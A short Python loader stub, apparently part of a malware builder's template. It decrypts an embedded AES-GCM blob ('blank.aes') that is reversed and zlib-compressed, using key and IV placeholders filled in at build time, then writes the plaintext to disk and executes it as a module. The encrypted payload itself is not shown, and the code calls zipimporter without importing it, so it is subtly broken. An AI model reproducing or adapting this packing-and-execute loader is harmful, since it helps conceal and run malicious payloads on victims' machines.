import os
import sys
import base64
import zlib
from pyaes import AESModeOfOperationGCM
from importlib.util import module_from_spec, spec_from_loader

zip_file = os.path.join(sys._MEIPASS, "blank.aes")
module_name = "stub_o"

key = base64.b64decode("%key%")
iv = base64.b64decode("%iv%")

def decrypt(key, iv, ciphertext):
    aes_cipher = AESModeOfOperationGCM(key, iv)
    return aes_cipher.decrypt(ciphertext)

if os.path.isfile(zip_file):
    with open(zip_file, "rb") as file:
        ciphertext = file.read()
    ciphertext = zlib.decompress(ciphertext[::-1])
    decrypted_data = decrypt(key, iv, ciphertext)
    with open(zip_file, "wb") as file:
        file.write(decrypted_data)
    
    spec = spec_from_loader(module_name, zipimporter(zip_file))
    module = module_from_spec(spec)
    spec.loader.exec_module(module)
